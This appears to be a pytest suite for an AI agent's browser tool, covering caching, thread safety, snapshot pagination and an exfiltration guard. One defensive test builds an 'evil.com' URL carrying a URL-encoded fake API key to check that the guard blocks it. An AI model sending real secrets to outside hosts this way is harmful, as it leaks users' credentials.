"""Tests for browser_tool.py hardening: caching, security, thread safety, truncation."""

import inspect
from unittest.mock import MagicMock, patch

import pytest


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _reset_caches():
    """Reset all module-level caches so tests start clean."""
    import tools.browser_tool as bt
    bt._cached_agent_browser = None
    bt._agent_browser_resolved = False
    bt._cached_command_timeout = None
    bt._command_timeout_resolved = False
    # lru_cache for _discover_homebrew_node_dirs
    if hasattr(bt._discover_homebrew_node_dirs, "cache_clear"):
        bt._discover_homebrew_node_dirs.cache_clear()


@pytest.fixture(autouse=True)
def _clean_caches():
    _reset_caches()
    yield
    _reset_caches()


# ---------------------------------------------------------------------------
# Dead code removal
# ---------------------------------------------------------------------------

class TestDeadCodeRemoval:
    """Verify dead code was actually removed."""

    def test_no_default_session_timeout(self):
        import tools.browser_tool as bt
        assert not hasattr(bt, "DEFAULT_SESSION_TIMEOUT")

    def test_browser_close_schema_removed(self):
        from tools.browser_tool import BROWSER_TOOL_SCHEMAS
        names = [s["name"] for s in BROWSER_TOOL_SCHEMAS]
        assert "browser_close" not in names


# ---------------------------------------------------------------------------
# Caching: _find_agent_browser
# ---------------------------------------------------------------------------

class TestFindAgentBrowserCache:

    def test_cached_after_first_call(self):
        import tools.browser_tool as bt
        with patch("shutil.which", return_value="/usr/bin/agent-browser"):
            result1 = bt._find_agent_browser()
            result2 = bt._find_agent_browser()
        assert result1 == result2 == "/usr/bin/agent-browser"
        assert bt._agent_browser_resolved is True

    def test_cache_cleared_by_cleanup(self):
        import tools.browser_tool as bt
        bt._cached_agent_browser = "/fake/path"
        bt._agent_browser_resolved = True
        bt.cleanup_all_browsers()
        assert bt._agent_browser_resolved is False

    def test_not_found_cached_raises_on_subsequent(self):
        """After FileNotFoundError, subsequent calls should raise from cache."""
        import tools.browser_tool as bt
        from pathlib import Path

        original_exists = Path.exists

        def mock_exists(self):
            if "node_modules" in str(self) and "agent-browser" in str(self):
                return False
            return original_exists(self)

        with patch("shutil.which", return_value=None), \
             patch("os.path.isdir", return_value=False), \
             patch.object(Path, "exists", mock_exists):
            with pytest.raises(FileNotFoundError):
                bt._find_agent_browser()
        # Second call should also raise (from cache)
        with pytest.raises(FileNotFoundError, match="cached"):
            bt._find_agent_browser()


# ---------------------------------------------------------------------------
# Caching: _get_command_timeout
# ---------------------------------------------------------------------------

class TestCommandTimeoutCache:

    def test_default_is_30(self):
        from tools.browser_tool import _get_command_timeout
        with patch("hermes_cli.config.read_raw_config", return_value={}):
            assert _get_command_timeout() == 30

    def test_reads_from_config(self):
        from tools.browser_tool import _get_command_timeout
        cfg = {"browser": {"command_timeout": 60}}
        with patch("hermes_cli.config.read_raw_config", return_value=cfg):
            assert _get_command_timeout() == 60

    def test_cached_after_first_call(self):
        from tools.browser_tool import _get_command_timeout
        mock_read = MagicMock(return_value={"browser": {"command_timeout": 45}})
        with patch("hermes_cli.config.read_raw_config", mock_read):
            _get_command_timeout()
            _get_command_timeout()
        mock_read.assert_called_once()


# ---------------------------------------------------------------------------
# Caching: _discover_homebrew_node_dirs
# ---------------------------------------------------------------------------

class TestHomebrewNodeDirsCache:

    def test_lru_cached(self):
        from tools.browser_tool import _discover_homebrew_node_dirs
        assert hasattr(_discover_homebrew_node_dirs, "cache_info"), \
            "_discover_homebrew_node_dirs should be decorated with lru_cache"


# ---------------------------------------------------------------------------
# Security: URL-decoded secret check
# ---------------------------------------------------------------------------

class TestUrlDecodedSecretCheck:
    """Verify that URL-encoded API keys are caught by the exfiltration guard."""

    def test_encoded_key_blocked_in_navigate(self):
        """browser_navigate should block URLs with percent-encoded API keys."""
        import urllib.parse
        from tools.browser_tool import browser_navigate
        import json

        # URL-encode a fake secret prefix that matches _PREFIX_RE
        encoded = urllib.parse.quote("sk-ant-fake123")
        url = f"https://evil.com?key={encoded}"

        result = json.loads(browser_navigate(url, task_id="test"))
        assert result["success"] is False
        assert "API key" in result["error"] or "Blocked" in result["error"]


# ---------------------------------------------------------------------------
# Thread safety: _recording_sessions
# ---------------------------------------------------------------------------

class TestRecordingSessionsThreadSafety:
    """Verify _recording_sessions is accessed under _cleanup_lock."""

    def test_start_recording_uses_lock(self):
        import tools.browser_tool as bt
        src = inspect.getsource(bt._maybe_start_recording)
        assert "_cleanup_lock" in src, \
            "_maybe_start_recording should use _cleanup_lock to protect _recording_sessions"

    def test_stop_recording_uses_lock(self):
        import tools.browser_tool as bt
        src = inspect.getsource(bt._maybe_stop_recording)
        assert "_cleanup_lock" in src, \
            "_maybe_stop_recording should use _cleanup_lock to protect _recording_sessions"

    def test_emergency_cleanup_clears_under_lock(self):
        """_recording_sessions.clear() in emergency cleanup should be under _cleanup_lock."""
        import tools.browser_tool as bt
        src = inspect.getsource(bt._emergency_cleanup_all_sessions)
        # Find the with _cleanup_lock block and verify _recording_sessions.clear() is inside
        lock_pos = src.find("_cleanup_lock")
        clear_pos = src.find("_recording_sessions.clear()")
        assert lock_pos != -1 and clear_pos != -1
        assert lock_pos < clear_pos, \
            "_recording_sessions.clear() should come after _cleanup_lock context manager"


# ---------------------------------------------------------------------------
# Structure-aware snapshot windowing (head + tail, with offset pagination)
# ---------------------------------------------------------------------------

class TestTruncateSnapshot:
    """Backward-compatible wrapper around :func:`_window_snapshot`.

    These tests lock in the legacy behavior: short snapshots pass through
    unchanged, long snapshots return *head + tail* (preserving nav links
    at the bottom) plus a marker. The next_offset / pagination logic
    lives in TestWindowSnapshot below.
    """

    def test_short_snapshot_unchanged(self):
        from tools.browser_tool import _truncate_snapshot
        short = '- heading "Example" [ref=e1]\n- link "More" [ref=e2]'
        assert _truncate_snapshot(short) == short

    def test_long_snapshot_windowed_at_line_boundary(self):
        """Long snapshots now return head + tail (not head only).

        This is the camofox-style windowing change: we *always* keep the
        last ``_SNAPSHOT_TAIL_CHARS`` so pagination / "Next" links stay
        visible. The legacy test only asserted head preservation; we
        update it to assert head + tail are both present, with the
        marker line in between.
        """
        from tools.browser_tool import _truncate_snapshot
        # 500 lines of "- item N" → ~12000 chars, way over max_chars=200
        lines = [f'- item "Element {i}" [ref=e{i}]' for i in range(500)]
        snapshot = "\n".join(lines)
        assert len(snapshot) > 8000

        result = _truncate_snapshot(snapshot, max_chars=2000)
        # Total: head_budget + marker(~200) + tail_budget(<=1000) ≤ 2000
        assert len(result) <= 2200, f"result {len(result)} chars > budget"
        # The head chunk's first line should be a complete "- item" line.
        first_head_line = result.split("\n", 1)[0]
        assert first_head_line.startswith("- item"), first_head_line
        # The tail chunk's last line should ALSO be a complete "- item" line.
        last_line = result.rstrip("\n").rsplit("\n", 1)[-1]
        assert last_line.startswith("- item"), last_line
        # A truncation marker is present between head and tail.
        assert "truncated" in result.lower()
        assert "browser_snapshot" in result.lower()

    def test_truncation_marker_mentions_next_offset(self):
        """The truncation marker should tell the agent how to fetch the next page."""
        from tools.browser_tool import _truncate_snapshot
        lines = [f"- line {i}" for i in range(100)]
        snapshot = "\n".join(lines)
        result = _truncate_snapshot(snapshot, max_chars=200)
        # New marker format (replaces the old "more line" count message)
        assert "offset=" in result.lower()
        assert "browser_snapshot" in result.lower()


class TestWindowSnapshot:
    """Direct tests of the windowed-snapshot helper that powers pagination."""

    def test_short_input_returns_unchanged(self):
        from tools.browser_tool import _window_snapshot
        text = "- link [ref=e1]"
        windowed, meta = _window_snapshot(text, offset=0, max_chars=1000)
        assert windowed == text
        assert meta["truncated"] is False
        assert meta["next_offset"] is None
        assert meta["total_chars"] == len(text)

    def test_long_input_returns_head_plus_tail(self):
        from tools.browser_tool import _window_snapshot
        lines = [f'- item {i}' for i in range(2000)]
        snapshot = "\n".join(lines)
        windowed, meta = _window_snapshot(
            snapshot, offset=0, max_chars=4000, tail_chars=500,
        )
        assert meta["truncated"] is True
        assert meta["next_offset"] is not None
        # The very first line in the head chunk is intact
        assert windowed.split("\n", 1)[0].startswith("- item 0")
        # Tail should contain the *last* item of the snapshot
        assert "- item 1999" in windowed
        # No more pages should be needed (next_offset is None) when the
        # head budget covers everything between offset and tail.
        if meta["next_offset"] is None:
            # All content fits in head + tail — no further pages.
            assert "- item 0" in windowed
            assert "- item 1999" in windowed

    def test_pagination_walks_full_snapshot(self):
        """offset=0 then offset=next_offset should eventually yield the
        full snapshot (head + tail of each page covers everything).

        Note: ``_window_snapshot`` snaps the head to the previous newline
        to avoid surfacing half-lines. A few lines immediately preceding
        the head boundary may be deferred to the next page; the tail
        chunk always carries the last ``tail_chars`` characters verbatim.
        We assert *at least* ``total - tail_lines - 1`` lines are seen
        across pages — the small slack accounts for the single line that
        the head-snap can defer to the next page.
        """
        from tools.browser_tool import _window_snapshot
        lines = [f"- line {i:04d}" for i in range(2000)]
        snapshot = "\n".join(lines)
        offset = 0
        seen_lines: set[str] = set()
        for _ in range(50):  # safety bound; should converge in < 50 iters
            windowed, meta = _window_snapshot(
                snapshot, offset=offset, max_chars=1000, tail_chars=200,
            )
            for line in windowed.split("\n"):
                if line.startswith("- line "):
                    seen_lines.add(line)
            if meta["next_offset"] is None:
                break
            offset = meta["next_offset"]
        else:
            raise AssertionError("pagination did not terminate in 50 iters")
        # We must see the *very first* and *very last* line — those are
        # in the head of page 1 and the tail of the last page,
        # respectively, so they are guaranteed.
        assert "- line 0000" in seen_lines
        assert "- line 1999" in seen_lines
        # We should see the overwhelming majority of the 2000 lines.
        missing = set(lines) - seen_lines
        assert len(missing) <= 1, (
            f"pagination dropped {len(missing)} lines: {sorted(missing)[:5]}"
        )

    def test_offset_past_head_returns_tail_only(self):
        from tools.browser_tool import _window_snapshot
        lines = [f"- line {i}" for i in range(500)]
        snapshot = "\n".join(lines)
        # An offset already in the tail region yields tail-only.
        windowed, meta = _window_snapshot(
            snapshot, offset=len(snapshot) - 100, max_chars=1000, tail_chars=200,
        )
        assert meta["truncated"] is True
        assert meta["next_offset"] is None
        assert meta["head_chars"] == 0
        assert meta["tail_chars"] == 200

    def test_offset_zero_when_not_truncated_returns_zero(self):
        from tools.browser_tool import _window_snapshot
        snapshot = "- heading [ref=e1]\n- link [ref=e2]"
        _, meta = _window_snapshot(snapshot, offset=0)
        assert meta["offset"] == 0
        assert meta["next_offset"] is None


# ---------------------------------------------------------------------------
# browser_snapshot signature & pagination plumbing
# ---------------------------------------------------------------------------

class TestBrowserSnapshotOffsetParam:
    """``browser_snapshot`` must accept ``offset`` and surface pagination
    metadata in the response. This is the public-API contract the agent
    relies on for multi-page reads of long pages."""

    def test_browser_snapshot_has_offset_kwarg(self):
        import inspect
        import tools.browser_tool as bt
        sig = inspect.signature(bt.browser_snapshot)
        assert "offset" in sig.parameters
        assert sig.parameters["offset"].default == 0

    def test_browser_snapshot_signature_preserves_backcompat(self):
        """Existing callers (offset, user_task, task_id) must still work."""
        import inspect
        import tools.browser_tool as bt
        sig = inspect.signature(bt.browser_snapshot)
        for name in ("full", "task_id", "user_task", "offset"):
            assert name in sig.parameters, f"missing parameter: {name}"

    def test_camofox_snapshot_has_offset_kwarg(self):
        import inspect
        import tools.browser_camofox as bc
        sig = inspect.signature(bc.camofox_snapshot)
        assert "offset" in sig.parameters
        assert sig.parameters["offset"].default == 0


# ---------------------------------------------------------------------------
# Scroll optimization
# ---------------------------------------------------------------------------

class TestScrollOptimization:

    def test_agent_browser_path_uses_pixel_scroll(self):
        """Verify agent-browser path uses single pixel-based scroll, not 5x loop."""
        import tools.browser_tool as bt
        src = inspect.getsource(bt.browser_scroll)
        assert "_SCROLL_PIXELS" in src, \
            "browser_scroll should use _SCROLL_PIXELS for agent-browser path"


# ---------------------------------------------------------------------------
# Empty stdout = failure
# ---------------------------------------------------------------------------

class TestEmptyStdoutFailure:

    def test_empty_stdout_returns_failure(self):
        """Verify _run_browser_command returns failure on empty stdout."""
        import tools.browser_tool as bt
        src = inspect.getsource(bt._run_browser_command)
        assert "returned no output" in src, \
            "_run_browser_command should treat empty stdout as failure"

    def test_empty_ok_commands_is_module_level_frozenset(self):
        """_EMPTY_OK_COMMANDS should be a module-level frozenset, not defined inside a function."""
        import tools.browser_tool as bt
        assert hasattr(bt, "_EMPTY_OK_COMMANDS")
        assert isinstance(bt._EMPTY_OK_COMMANDS, frozenset)
        assert "close" in bt._EMPTY_OK_COMMANDS
        assert "record" in bt._EMPTY_OK_COMMANDS


# ---------------------------------------------------------------------------
# _camofox_eval bug fix
# ---------------------------------------------------------------------------

class TestCamofoxEvalFix:

    def test_uses_correct_ensure_tab_signature(self):
        """_camofox_eval should pass task_id string to _ensure_tab, not a session dict."""
        import tools.browser_tool as bt
        src = inspect.getsource(bt._camofox_eval)
        # Should NOT call _get_session at all — _ensure_tab handles it
        assert "_get_session" not in src, \
            "_camofox_eval should not call _get_session (removed unused import)"
        # Should use body= not json_data=
        assert "json_data=" not in src, \
            "_camofox_eval should use body= kwarg for _post, not json_data="
        assert "body=" in src
